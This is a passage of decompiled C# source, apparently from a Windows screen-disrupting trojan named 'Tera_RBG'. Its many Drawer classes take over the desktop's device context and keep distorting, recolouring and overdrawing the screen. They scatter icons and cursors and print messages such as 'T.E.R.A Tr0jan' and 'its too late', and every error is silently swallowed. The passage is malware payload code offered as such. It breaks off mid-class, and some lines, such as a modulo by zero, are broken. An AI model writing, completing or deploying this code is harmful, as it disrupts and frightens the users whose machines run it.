using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Tera_RBG;

internal class GDI
{
	private class ReDrawer : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			for (int i = 0; i < 3; i++)
			{
				Redraw();
			}
			Thread.Sleep(random.Next(7500));
		}
	}

	private class Drawer1 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			//IL_005e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0065: Expected O, but got Unknown
			try
			{
				Graphics val = Graphics.FromHdc(hdc);
				System.Type typeFromHandle = typeof(Cursors);
				PropertyInfo[] properties = typeFromHandle.GetProperties(BindingFlags.Static | BindingFlags.Public);
				PropertyInfo[] array = properties;
				foreach (PropertyInfo propertyInfo in array)
				{
					Point location = new Point(random.Next(screenW), random.Next(screenH));
					Cursor val2 = (Cursor)propertyInfo.GetValue(null, null);
					val2.Draw(val, new Rectangle(location, val2.Size));
					Thread.Sleep(random.Next(2));
				}
				val.Dispose();
			}
			catch
			{
			}
		}
	}

	private class Drawer2 : Drawer
	{
		private int redrawCounter;

		private Icon app = Extract("user32.dll", 5, largeIcon: true);

		private Icon warn_ico = Extract("user32.dll", 1, largeIcon: true);

		private Icon no_ico = Extract("user32.dll", 3, largeIcon: true);

		public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics val = Graphics.FromHdc(hdc);
				Bitmap val2 = app.ToBitmap();
				Bitmap val3 = warn_ico.ToBitmap();
				Bitmap val4 = no_ico.ToBitmap();
				val.DrawImage((Image)(object)val2, random.Next(screenW), random.Next(screenH), random.Next(600), random.Next(590));
				val.DrawImage((Image)(object)val3, random.Next(screenW), random.Next(screenH), random.Next(700), random.Next(710));
				val.DrawImage((Image)(object)val4, random.Next(screenW), random.Next(screenH), random.Next(500), random.Next(500));
			}
			catch
			{
			}
			Thread.Sleep(random.Next(1));
		}
	}

	private class Drawer3 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			//IL_0095: Unknown result type (might be due to invalid IL or missing references)
			//IL_009b: Expected O, but got Unknown
			//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00e4: Expected O, but got Unknown
			//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
			//IL_012e: Expected O, but got Unknown
			//IL_0149: Unknown result type (might be due to invalid IL or missing references)
			//IL_0178: Expected O, but got Unknown
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				Graphics val = Graphics.FromHdc(intPtr);
				val.RotateTransform((float)random.Next(360));
				Brush val2 = (Brush)new SolidBrush(Color.FromArgb(random.Next(255), random.Next(255), random.Next(255)));
				val.DrawString("T.E.R.A Tr0jan", new Font(FontFamily.GenericSansSerif, (float)random.Next(1, 100)), val2, (float)random.Next(screenW), (float)random.Next(screenH));
				val.DrawString("its too late", new Font(FontFamily.GenericSansSerif, (float)random.Next(1, 100)), val2, (float)random.Next(screenW), (float)random.Next(screenH));
				val.DrawString("you are my doom", new Font(FontFamily.GenericSansSerif, (float)random.Next(1, 100)), val2, (float)random.Next(screenW), (float)random.Next(screenH));
				BitBlt(hdc, 0, 0, screenW, screenH, intPtr, random.Next(-1, 2), random.Next(-1, 2), 13369376);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
			}
			catch
			{
			}
			Thread.Sleep(random.Next(2));
		}
	}

	public struct RGB
	{
		internal static object Properties;

		private byte _r;

		private byte _g;

		private byte _b;

		public byte R
		{
			get
			{
				return _r;
			}
			set
			{
				_r = value;
			}
		}

		public byte G
		{
			get
			{
				return _g;
			}
			set
			{
				_g = value;
			}
		}

		public byte B
		{
			get
			{
				return _b;
			}
			set
			{
				_b = value;
			}
		}

		public RGB(byte r, byte g, byte b)
		{
			_r = r;
			_g = g;
			_b = b;
		}

		public bool Equals(RGB rgb)
		{
			return R == rgb.R && G == rgb.G && B == rgb.B;
		}
	}

	public struct HSL
	{
		private int _h;

		private float _s;

		private float _l;

		public int H
		{
			get
			{
				return _h;
			}
			set
			{
				_h = value;
			}
		}

		public float S
		{
			get
			{
				return _s;
			}
			set
			{
				_s = value;
			}
		}

		public float L
		{
			get
			{
				return _l;
			}
			set
			{
				_l = value;
			}
		}

		public HSL(int h, float s, float l)
		{
			_h = h;
			_s = s;
			_l = l;
		}

		public bool Equals(HSL hsl)
		{
			return H == hsl.H && S == hsl.S && L == hsl.L;
		}
	}

	private class Drawer4 : Drawer
	{
		private int redrawCounter;

		private static Random r = new Random();

		private int cc;

		private static int ballWidth = 200;

		private static int ballHeight = 200;

		private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 200);

		private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 200);

		private static int moveStepX = 10;

		private static int moveStepY = 10;

		public override void Draw(IntPtr hdc)
		{
			//IL_0232: Unknown result type (might be due to invalid IL or missing references)
			//IL_0239: Expected O, but got Unknown
			//IL_023e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0245: Expected O, but got Unknown
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				Graphics val = Graphics.FromHdc(intPtr);
				double num = Screen.PrimaryScreen.Bounds.Width / 10;
				int num2 = Screen.PrimaryScreen.Bounds.Height / 10;
				float num3 = 0f;
				float num4 = 0f;
				float num5 = 10f;
				for (float num6 = 0f; (double)num6 < num; num6 += 0.1f)
				{
					float num7 = (float)Math.Sin(num6);
					redrawCounter++;
					int num8 = redrawCounter;
					int num9 = (int)(num3 * num5 + num4);
					BitBlt(intPtr, num8, num9, 1, screenH, intPtr, num8, 0, 13369376);
					BitBlt(intPtr, num8, screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
					BitBlt(intPtr, num8, -screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
					if (redrawCounter >= screenW)
					{
						redrawCounter = 0;
					}
					num3 = num7;
				}
				ballPosX += moveStepX;
				if (ballPosX < 0 || ballPosX + ballWidth > screenW)
				{
					moveStepX = -moveStepX;
				}
				ballPosY += moveStepY;
				if (ballPosY < 0 || ballPosY + ballHeight > screenH)
				{
					moveStepY = -moveStepY;
				}
				cc += 10;
				HSL hsl = new HSL(cc % 120, 1f, 0.5f);
				RGB rGB = HSLToRGB(hsl);
				Brush val2 = (Brush)new SolidBrush(Color.FromArgb(rGB.R, rGB.G, rGB.B));
				Pen val3 = new Pen(Color.Red);
				val.FillEllipse(val2, ballPosX, ballPosY, ballWidth, ballHeight);
				for (int i = 0; i < 100; i += 10)
				{
					val.DrawEllipse(val3, ballPosX - i / 2, ballPosY - i / 2, ballWidth + i, ballHeight + i);
				}
				BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer5 : Drawer
	{
		private int redrawCounter;

		private static Random r = new Random();

		private int cc;

		private static int ballWidth = 200;

		private static int ballHeight = 200;

		private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 200);

		private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 200);

		private static int moveStepX = 10;

		private static int moveStepY = 10;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				double num = (double)Environment.TickCount * 0.002;
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				for (int i = 0; i < screenH; i++)
				{
					double num2 = Math.Sin((double)i * 0.02 + num) * 30.0;
					int nXDest = (int)num2;
					BitBlt(intPtr, nXDest, i, screenW, 1, intPtr, 0, i, 13369376);
					double num3 = (Math.Sin(num + (double)i * 0.01) * 0.5 + 0.5) * 255.0;
					double num4 = (Math.Sin(num + (double)i * 0.01 + 2.094) * 0.5 + 0.5) * 255.0;
					double num5 = (Math.Sin(num + (double)i * 0.01 + 4.188) * 0.5 + 0.5) * 255.0;
					byte b = (byte)num3;
					byte b2 = (byte)num4;
					byte b3 = (byte)num5;
					for (int j = 0; j < screenW; j += 3)
					{
						uint pixel = GetPixel(intPtr, j, i);
						byte b4 = (byte)(pixel & 0xFFu);
						byte b5 = (byte)((pixel >> 8) & 0xFFu);
						byte b6 = (byte)((pixel >> 16) & 0xFFu);
						b4 = (byte)(b4 + b >> 1);
						b5 = (byte)(b5 + b2 >> 1);
						b6 = (byte)(b6 + b3 >> 1);
						uint color = (uint)(b4 | (b5 << 8) | (b6 << 16));
						SetPixelV(intPtr, j, i, color);
					}
				}
				BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(1);
			}
			catch
			{
			}
		}
	}

	private class Drawer6 : Drawer
	{
		private int redrawCounter;

		private int redrawCounter2;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				double num = Screen.PrimaryScreen.Bounds.Width / 1;
				int num2 = Screen.PrimaryScreen.Bounds.Height / 1;
				float num3 = 0f;
				float num4 = 10f;
				float num5 = 10f;
				for (float num6 = 0f; (double)num6 < num; num6 += 1f)
				{
					float num7 = (float)Math.Sin(num6);
					redrawCounter++;
					int num8 = redrawCounter;
					int num9 = (int)(num3 * num5 + num4);
					BitBlt(intPtr, num8, num9, 1, screenH, intPtr, num8, 0, 13369376);
					BitBlt(intPtr, num8, screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
					BitBlt(intPtr, num8, -screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
					if (redrawCounter >= screenW)
					{
						redrawCounter = 0;
					}
					num3 = num7;
				}
				BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer7 : Drawer
	{
		private int redrawCounter;

		private int cc;

		public override void Draw(IntPtr hdc)
		{
			//IL_016d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0174: Expected O, but got Unknown
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				Graphics val = Graphics.FromHdc(intPtr);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				for (int i = 0; i < screenH; i += 2)
				{
					BitBlt(intPtr, -50, i, screenW, 1, intPtr, 0, i, 13369376);
					BitBlt(intPtr, screenW - 50, i, screenW, 1, intPtr, 0, i, 13369376);
					BitBlt(intPtr, -25, i - 1, screenW, 1, intPtr, 0, i - 1, 13369376);
					BitBlt(intPtr, screenW - 25, i - 1, screenW, 1, intPtr, 0, i - 1, 13369376);
				}
				for (int j = 0; j < screenH; j += 2)
				{
					cc++;
					HSL hsl = new HSL(cc % 240, 1f, 0.5f);
					RGB rGB = HSLToRGB(hsl);
					Pen val2 = new Pen(Color.FromArgb(69, rGB.R, rGB.G, rGB.B), 2f);
					val.DrawLine(val2, 0, j, screenW, j);
				}
				_BLENDFUNCTION ftn = default(_BLENDFUNCTION);
				ftn.BlendOp = 0;
				ftn.BlendFlags = 0;
				ftn.SourceConstantAlpha = 64;
				ftn.AlphaFormat = 0;
				AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, ftn);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer8 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				Graphics val = Graphics.FromHdc(intPtr);
				POINT[] array = new POINT[3];
				int left = Screen.PrimaryScreen.Bounds.Left;
				int top = Screen.PrimaryScreen.Bounds.Top;
				int right = Screen.PrimaryScreen.Bounds.Right;
				int bottom = Screen.PrimaryScreen.Bounds.Bottom;
				int num = random.Next(1, 26);
				int num2 = random.Next(-5, 6);
				int num3 = random.Next(-5, 6);
				int num4 = random.Next(-5, 6);
				int num5 = random.Next(-5, 6);
				int num6 = random.Next(-5, 6);
				int num7 = random.Next(-5, 6);
				for (int i = 0; i < num; i++)
				{
					array[0].X = left - num2;
					array[0].Y = top + num3;
					array[1].X = right - num4;
					array[1].Y = top + num5;
					array[2].X = left + num6;
					array[2].Y = bottom - num7;
					PlgBlt(intPtr, array, intPtr, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
					BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 6684742);
				}
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer9 : Drawer
	{
		private int redrawCounter;

		public unsafe override void Draw(IntPtr hdc)
		{
			//IL_002d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0033: Expected O, but got Unknown
			//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ba: Expected O, but got Unknown
			//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
			//IL_0265: Unknown result type (might be due to invalid IL or missing references)
			//IL_026c: Expected O, but got Unknown
			try
			{
				Bitmap val = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, (PixelFormat)2498570);
				Graphics.FromImage((Image)(object)val).CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, (CopyPixelOperation)13369376);
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				val2.SmoothingMode = (SmoothingMode)1;
				val2.PixelOffsetMode = (PixelOffsetMode)1;
				float num = 5f;
				num = (100f + num) / 100f;
				num *= num;
				Bitmap val3 = (Bitmap)((Image)val).Clone();
				BitmapData val4 = val3.LockBits(new Rectangle(0, 0, ((Image)val3).Width, ((Image)val3).Height), (ImageLockMode)3, ((Image)val3).PixelFormat);
				int height = ((Image)val3).Height;
				int width = ((Image)val3).Width;
				for (int i = 0; i < height; i++)
				{
					byte* ptr = (byte*)(void*)val4.Scan0 + i * val4.Stride;
					int num2 = 0;
					for (int j = 0; j < width; j++)
					{
						byte b = ptr[num2];
						byte b2 = ptr[num2 + 1];
						float num3 = (float)(int)ptr[num2 + 2] / 255f;
						float num4 = (float)(int)b2 / 255f;
						float num5 = (float)(int)b / 255f;
						float num6 = ((num3 - 0.5f) * num + 0.5f) * 255f;
						num4 = ((num4 - 0.5f) * num + 0.5f) * 255f;
						num5 = ((num5 - 0.5f) * num + 0.5f) * 255f;
						int num7 = (int)num6;
						num7 = ((num7 > 255) ? 255 : num7);
						num7 = ((num7 >= 0) ? num7 : 0);
						int num8 = (int)num4;
						num8 = ((num8 > 255) ? 255 : num8);
						num8 = ((num8 >= 0) ? num8 : 0);
						int num9 = (int)num5;
						num9 = ((num9 > 255) ? 255 : num9);
						num9 = ((num9 >= 0) ? num9 : 0);
						ptr[num2] = (byte)num9;
						ptr[num2 + 1] = (byte)num8;
						ptr[num2 + 2] = (byte)num7;
						num2 += 4;
					}
				}
				val3.UnlockBits(val4);
				Bitmap val5 = new Bitmap((Image)(object)val3);
				IntPtr hdc2 = Graphics.FromHdc(GetDC(IntPtr.Zero)).GetHdc();
				IntPtr intPtr = CreateCompatibleDC(hdc2);
				SelectObject(intPtr, val5.GetHbitmap());
				for (int k = 0; k < screenH; k += 2)
				{
					BitBlt(intPtr, -1, k, screenW, 1, intPtr, 0, k, 13369376);
					BitBlt(intPtr, screenW - 1, k, screenW, 1, intPtr, 0, k, 13369376);
					BitBlt(intPtr, 1, k - 1, screenW, 1, intPtr, 0, k - 1, 13369376);
					BitBlt(intPtr, -screenW + 1, k - 1, screenW, 1, intPtr, 0, k - 1, 13369376);
				}
				BitBlt(hdc2, 0, 0, ((Image)val5).Width, ((Image)val5).Height, intPtr, 0, 0, 13369376);
				DeleteObject(hdc2);
				DeleteObject(intPtr);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer10 : Drawer
	{
		private int redrawCounter2;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				float num = 0f;
				float num2 = 0f;
				float num3 = 0f;
				float num4 = 0f;
				float num5 = 5f;
				for (float num6 = 0f; num6 < (float)(Screen.PrimaryScreen.Bounds.Height / 10); num6 += 0.1f)
				{
					num3 = (float)Math.Sin(num6);
					redrawCounter2++;
					int num7 = redrawCounter2;
					int num8 = (int)(num2 * num5 + num4);
					BitBlt(intPtr, num8, num7, screenW, 1, intPtr, 0, num7, 13369376);
					BitBlt(intPtr, screenW + num8, num7, screenW, 1, intPtr, 0, num7, 13369376);
					BitBlt(intPtr, -screenW + num8, num7, screenW, 1, intPtr, 0, num7, 13369376);
					if (redrawCounter2 >= screenH)
					{
						redrawCounter2 = 0;
					}
					num = num6;
					num2 = num3;
				}
				BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
				ReleaseDC(intPtr, intPtr2);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer11 : Drawer
	{
		private int redrawCounter;

		private int redrawCounter2;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				double num = Screen.PrimaryScreen.Bounds.Width / 1000;
				double num2 = Screen.PrimaryScreen.Bounds.Height / 1000;
				float num3 = 0f;
				float num4 = 0f;
				float num5 = 50f;
				for (float num6 = 0f; (double)num6 < num; num6 += 0.001f)
				{
					float num7 = (float)Math.Sin(num6);
					redrawCounter++;
					int num8 = redrawCounter;
					int num9 = (int)Math.Round(num3 * num5 + num4);
					BitBlt(intPtr, num8, num9, 1, screenH, intPtr, num8, 0, 13369376);
					BitBlt(intPtr, num8, screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
					BitBlt(intPtr, num8, -screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
					if (redrawCounter >= screenW)
					{
						redrawCounter = 0;
					}
					num3 = num7;
				}
				for (float num10 = 0f; (double)num10 < num2; num10 += 0.001f)
				{
					float num11 = (float)Math.Sin(num10);
					redrawCounter2++;
					int num12 = redrawCounter2;
					int num13 = (int)Math.Round(num3 * num5 + num4);
					BitBlt(intPtr, num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
					BitBlt(intPtr, screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
					BitBlt(intPtr, -screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
					if (redrawCounter2 >= screenH)
					{
						redrawCounter2 = 0;
					}
					num3 = num11;
				}
				BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer12 : Drawer
	{
		private int redrawCounter;

		private int redrawCounter2;

		private static Random r = new Random();

		private int cc;

		private static int ballWidth = 500;

		private static int ballHeight = 500;

		private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

		private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

		private static int moveStepX = 50;

		private static int moveStepY = 50;

		public override void Draw(IntPtr hdc)
		{
			//IL_0320: Unknown result type (might be due to invalid IL or missing references)
			//IL_0327: Expected O, but got Unknown
			//IL_032c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0333: Expected O, but got Unknown
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				Graphics val = Graphics.FromHdc(intPtr);
				double num = Screen.PrimaryScreen.Bounds.Width / 1000;
				double num2 = Screen.PrimaryScreen.Bounds.Height / 1000;
				float num3 = 0f;
				float num4 = 0f;
				float num5 = 50f;
				for (float num6 = 0f; (double)num6 < num; num6 += 0.001f)
				{
					float num7 = (float)Math.Sin(num6);
					redrawCounter++;
					int num8 = redrawCounter;
					int num9 = (int)Math.Round(num3 * num5 + num4);
					BitBlt(intPtr, num8, num9, 1, screenH, intPtr, num8, 0, 13369376);
					BitBlt(intPtr, num8, screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
					BitBlt(intPtr, num8, -screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
					if (redrawCounter >= screenW)
					{
						redrawCounter = 0;
					}
					num3 = num7;
				}
				for (float num10 = 0f; (double)num10 < num2; num10 += 0.001f)
				{
					float num11 = (float)Math.Sin(num10);
					redrawCounter2++;
					int num12 = redrawCounter2;
					int num13 = (int)Math.Round(num3 * num5 + num4);
					BitBlt(intPtr, num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
					BitBlt(intPtr, screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
					BitBlt(intPtr, -screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
					if (redrawCounter2 >= screenH)
					{
						redrawCounter2 = 0;
					}
					num3 = num11;
				}
				ballPosX += moveStepX;
				if (ballPosX < 0 || ballPosX + ballWidth > screenW)
				{
					moveStepX = -moveStepX;
				}
				ballPosY += moveStepY;
				if (ballPosY < 0 || ballPosY + ballHeight > screenH)
				{
					moveStepY = -moveStepY;
				}
				cc += 10;
				HSL hsl = new HSL(cc % 240, 1f, 0.5f);
				RGB rGB = HSLToRGB(hsl);
				Brush val2 = (Brush)new SolidBrush(Color.FromArgb(rGB.R, rGB.G, rGB.B));
				Pen val3 = new Pen(Color.Red);
				val.FillEllipse(val2, ballPosX, ballPosY, ballWidth, ballHeight);
				BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 6684742);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer13 : Drawer
	{
		private int redrawCounter;

		private int redrawCounter2;

		private static Random r = new Random();

		private int cc;

		private static int ballWidth = 500;

		private static int ballHeight = 500;

		private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

		private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

		private static int moveStepX = 50;

		private static int moveStepY = 50;

		public override void Draw(IntPtr hdc)
		{
			//IL_031c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0323: Expected O, but got Unknown
			//IL_0328: Unknown result type (might be due to invalid IL or missing references)
			//IL_032f: Expected O, but got Unknown
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				Graphics val = Graphics.FromHdc(intPtr);
				double num = Screen.PrimaryScreen.Bounds.Width / 1000;
				double num2 = Screen.PrimaryScreen.Bounds.Height / 1000;
				float num3 = 0f;
				float num4 = 0f;
				float num5 = 50f;
				for (float num6 = 0f; (double)num6 < num; num6 += 0.001f)
				{
					float num7 = (float)Math.Sin(num6);
					redrawCounter++;
					int num8 = redrawCounter;
					int num9 = (int)Math.Round(num3 * num5 + num4);
					BitBlt(intPtr, num8, num9, 1, screenH, intPtr, num8, 0, 13369376);
					BitBlt(intPtr, num8, screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
					BitBlt(intPtr, num8, -screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
					if (redrawCounter >= screenW)
					{
						redrawCounter = 0;
					}
					num3 = num7;
				}
				for (float num10 = 0f; (double)num10 < num2; num10 += 0.001f)
				{
					float num11 = (float)Math.Sin(num10);
					redrawCounter2++;
					int num12 = redrawCounter2;
					int num13 = (int)Math.Round(num3 * num5 + num4);
					BitBlt(intPtr, num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
					BitBlt(intPtr, screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
					BitBlt(intPtr, -screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
					if (redrawCounter2 >= screenH)
					{
						redrawCounter2 = 0;
					}
					num3 = num11;
				}
				ballPosX += moveStepX;
				if (ballPosX < 0 || ballPosX + ballWidth > screenW)
				{
					moveStepX = -moveStepX;
				}
				ballPosY += moveStepY;
				if (ballPosY < 0 || ballPosY + ballHeight > screenH)
				{
					moveStepY = -moveStepY;
				}
				cc += 10;
				HSL hsl = new HSL(cc % 0, 1f, 0.5f);
				RGB rGB = HSLToRGB(hsl);
				Brush val2 = (Brush)new SolidBrush(Color.FromArgb(rGB.R, rGB.G, rGB.B));
				Pen val3 = new Pen(Color.Red);
				val.FillEllipse(val2, ballPosX, ballPosY, ballWidth, ballHeight);
				BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 4457256);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer14 : Drawer
	{
		private int cc;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, random.Next(-10, 10), random.Next(-10, 10), 6684742);
				cc += 10;
				HSL hsl = new HSL(cc % 360, 1f, 0.5f);
				RGB rGB = HSLToRGB(hsl);
				IntPtr hgdiobj = CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.FromArgb(rGB.R, rGB.G, rGB.B)));
				SelectObject(intPtr, hgdiobj);
				PatBlt(intPtr, 0, 0, screenW, screenH, (CopyPixelOperation)5898313);
				_BLENDFUNCTION ftn = default(_BLENDFUNCTION);
				ftn.BlendOp = 0;
				ftn.BlendFlags = 0;
				ftn.SourceConstantAlpha = 16;
				ftn.AlphaFormat = 0;
				AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, ftn);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer15 : Drawer
	{
		private int redrawCounter;

		private int redrawCounter2;

		private static Random r = new Random();

		private int cc;

		private static int ballWidth = 0;

		private static int ballHeight = 0;

		private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

		private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

		private static int moveStepX = r.Next(1, 17);

		private static int moveStepY = r.Next(1, 17);

		private static int ballWidth1 = 0;

		private static int ballHeight1 = 0;

		private static int ballPosX1 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

		private static int ballPosY1 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

		private static int moveStepX1 = r.Next(1, 17);

		private static int moveStepY1 = r.Next(1, 17);

		private static int ballWidth2 = 0;

		private static int ballHeight2 = 0;

		private static int ballPosX2 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

		private static int ballPosY2 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

		private static int moveStepX2 = r.Next(1, 17);

		private static int moveStepY2 = r.Next(1, 17);

		public override void Draw(IntPtr hdc)
		{
			//IL_02ec: Unknown result type (might be due to invalid IL or missing references)
			//IL_02f3: Expected O, but got Unknown
			//IL_02f8: Unknown result type (might be due to invalid IL or missing references)
			//IL_02ff: Expected O, but got Unknown
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
